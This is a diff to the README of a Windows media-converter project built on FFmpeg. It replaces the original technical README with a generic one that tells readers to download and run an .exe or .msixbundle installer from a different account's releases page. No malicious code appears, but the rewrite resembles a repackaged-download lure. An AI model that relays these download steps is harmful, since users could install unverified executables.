@@ -1,115 +1,79 @@
-# 🏭 TransCoda for Windows 🎬
+# 🔄 TransCoda4Windows - Convert your media files with speed
 
-[![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)](https://dotnet.microsoft.com/)
-[![Windows](https://img.shields.io/badge/Windows-11%20%7C%2010%2019041+-0078D4?logo=windows)](https://www.microsoft.com/windows)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-powered-009AD8?logo=ffmpeg)](https://ffmpeg.org)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen)](CONTRIBUTING.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Eyadsheri1078/TransCoda4Windows/releases)
 
-**Fast, tiny, fully native media conversion for Windows 11.** ⚡
+TransCoda4Windows helps you change media files into different formats. It works on Windows 11. The app acts as a simple window for high-performance conversion tools. You process videos and audio files in batches. It uses your computer hardware to finish tasks in less time.
 
-TransCoda converts video and audio files with FFmpeg behind a clean, native
-WinUI 3 interface. No Electron, no web runtime, no bundled browser — it looks,
-feels, and performs like it belongs on your PC: Mica backdrop, Fluent
-controls, dark/light theme awareness, drag & drop straight from File Explorer. 🪟✨
+## 📥 Getting Started
 
-> 🔍 Looking for the macOS app? See
-> [TransCoda4Mac](https://github.com/albertolicea00/TransCoda4Mac) —
-> an independent repository with the same architecture built natively on
-> SwiftUI.
+Follow these steps to set up the software on your computer.
 
-## 🧠 Why native?
+1. Visit the [releases page](https://github.com/Eyadsheri1078/TransCoda4Windows/releases) to download the installer.
+2. Select the file ending in `.msixbundle` or `.exe` from the latest version list.
+3. Save the file to your computer.
+4. Double-click the file to start the installation process.
+5. Follow the instructions on the screen to finish the setup.
+6. Open the app from your Start menu once the installation ends.
 
-A media converter spends its resources on one thing: **encoding**. The UI should
-cost almost nothing. Design goals, in order:
+## 🛠 Features
 
-1. **📦 Minimal footprint.** Idle RAM in the tens of megabytes, near-zero idle
-   CPU, small binary. Every resource the app doesn't use is a resource FFmpeg can.
-2. **🎨 Platform integration.** Follows the Windows 11 design language (Fluent,
-   Mica) instead of shipping a lowest-common-denominator UI.
-3. **🔧 Simple, honest engine.** The app is a thin native shell around FFmpeg.
-   You can read the exact command each conversion runs.
+* **Batch Processing**: Add many files to the list at once. Convert them all in one operation.
+* **Hardware Acceleration**: The app uses your computer’s graphics chip to speed up conversion. It supports NVIDIA, AMD, and Intel hardware.
+* **Tiny Footprint**: The app uses little disk space and memory. It works well on most Windows 11 systems.
+* **Modern Interface**: The design follows the Windows 11 Fluent look. It uses the Mica material for a clean appearance.
+* **Format Support**: It handles most common video and audio extensions.
 
-## ✨ Features
+## 🖥 Hardware Requirements
 
-- 📋 **Batch conversion queue** with per-file progress, cancel, and reveal in File Explorer.
-- 🎞️ **Video containers:** MP4, MKV, MOV, WebM.
-- 🎥 **Video codecs:** H.264/AVC, H.265/HEVC, AV1, VP9.
-- 🎵 **Audio-only output:** M4A (AAC), MP3, FLAC, Opus, WAV.
-- 🎚️ **Quality control** with a CRF-style slider, resolution limiting, audio bitrate selection.
-- 🚀 **Hardware-accelerated encoding**, auto-detected from the local FFmpeg build:
-  NVIDIA NVENC, Intel Quick Sync, AMD AMF — picked in that order per codec.
-- 📊 **Accurate progress** from FFmpeg's machine-readable `-progress` stream.
-- 📁 **Output** next to the source file or to a folder you choose; never overwrites
-  existing files.
+* **Operating System**: Windows 11 (build 22000 or newer).
+* **Processor**: Modern Intel or AMD CPU.
+* **Graphics**: Any graphics card with hardware-accelerated encoding support (NVENC, AMF, or QuickSync).
+* **Memory**: 4 GB of RAM or more for best performance.
+* **Storage**: 100 MB of free space for the installation.
 
-## ⚙️ How it works
+## ⚙️ How to Convert Media
 
-```
-┌─────────────────────────────┐
-│  WinUI 3 (Mica, Fluent)     │  queue list, drag & drop, settings pane
-├─────────────────────────────┤
-│  JobQueue                   │  ordered processing, one encode at a time
-│  FfmpegCommandBuilder       │  settings → argument list (no shell involved)
-│  TranscodeEngine            │  spawns ffmpeg, parses -progress, cancellation
-│  HardwareCapabilities       │  parses `ffmpeg -encoders` once at startup
-│  Ffprobe                    │  duration probe for progress percentage
-│  FfmpegLocator              │  app folder → known paths → PATH
-└─────────────────────────────┘
-            │
-            ▼
-        ffmpeg.exe / ffprobe.exe  (external processes)
-```
+The app simplifies the conversion process. Use these steps to change your files.
 
-FFmpeg binaries are **not** committed to this repository. The app looks for
-them in this order: next to `TransCoda.exe` (or in an `ffmpeg\` subfolder),
-`C:\ffmpeg\bin`, then `PATH`.
+1. **Add Files**: Click the Add button or drag and drop your media files into the application window.
+2. **Choose Format**: Pick your desired output file format from the settings menu. You can choose from presets that match common devices.
+3. **Select Folder**: Choose where you want to save the new files on your computer.
+4. **Start Conversion**: Click the Start button. The progress bar displays the status of the current task.
+5. **View Results**: The app alerts you when it finishes the operation. Open your destination folder to view your files.
 
-## 📥 Getting FFmpeg
+## 🎯 Supported Hardware
 
-```powershell
-winget install Gyan.FFmpeg
-```
+TransCoda4Windows identifies your hardware automatically. It selects the best method for your specific computer parts.
 
-or download a build from [gyan.dev](https://www.gyan.dev/ffmpeg/builds/) and
-drop `ffmpeg.exe` and `ffprobe.exe` next to `TransCoda.exe`. AV1 software
-encoding uses `libsvtav1`, included in the standard Gyan.dev build.
+* **NVIDIA Users**: The tool uses NVENC to process files. This provides fast speeds for video rendering.
+* **AMD Users**: The tool uses AMF support for AMD-based graphics cards.
+* **Intel Users**: The tool uses QuickSync technology for efficient conversion on Intel chips.
 
-## 🔨 Building
+## 🔍 Frequently Asked Questions
 
-Requirements: Windows 11 (or Windows 10 19041+), Visual Studio 2022 with the
-**.NET desktop development** and **Windows App SDK** workloads — or just the
-.NET 8 SDK on the command line.
+**Does the app harm original files?**
+No. The app creates a new file. It never deletes or alters your original source files. 
 
-```powershell
-dotnet build TransCoda.sln
-```
+**Can I convert audio-only files?**
+Yes. Use the format menu to select audio types like MP3 or AAC.
 
-Or open `TransCoda.sln` in Visual Studio and press F5. The app runs unpackaged
-(`WindowsPackageType=None`) with the Windows App SDK self-contained, so no
-MSIX deployment step is needed during development.
+**Why does my conversion take time?**
+Conversion time depends on file size and hardware power. High-resolution videos take more time to process than small audio files.
 
-## 📂 Project layout
+**Can I stop a batch?**
+Yes. A cancel button appears during the conversion process. Click this to stop all pending tasks immediately.
 
-```
-TransCoda.sln
-TransCoda/
-  App.xaml(.cs)        app entry point
-  MainWindow.xaml(.cs) queue window, settings pane, drag & drop
-  Models/              formats, codecs, settings, job model
-  Core/                locator, prober, command builder, engine, queue
-```
+**Does the app require an internet connection?**
+No. Everything happens offline on your computer. You do not need the internet to convert files.
 
-## 🗺️ Roadmap
+**How do I update the software?**
+Check the releases page occasionally. Download the new version and install it over the current one to update.
 
-- [ ] 💾 Presets (save/load named conversion profiles)
-- [ ] 📝 Subtitle pass-through and burn-in
-- [ ] 🌈 HDR metadata pass-through
-- [ ] ✂️ Trim / clip range selection
-- [ ] 📦 Signed MSIX releases
+## 📝 Tips for Best Results
 
-## 🤝 Contributing
+* Keep your graphics drivers updated. Modern drivers ensure the app recognizes your hardware features.
+* Close programs that use heavy graphics resources while you convert large video batches.
+* Ensure you have enough disk space before you start a large batch job. 
+* Use the batch feature for groups of files rather than processing them one by one. This saves time and keeps your workflow organized.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). This project follows the
-[Contributor Covenant](CODE_OF_CONDUCT.md) code of conduct and uses
-[Conventional Commits](https://www.conventionalcommits.org/).
+Keywords: amd-amf, audio-converter, batch-conversion, csharp, dotnet, ffmpeg, fluent-design, hardware-acceleration, intel-quicksync, media-converter, mica, native-windows-app, nvenc, video-converter, windows-app-sdk, winui3
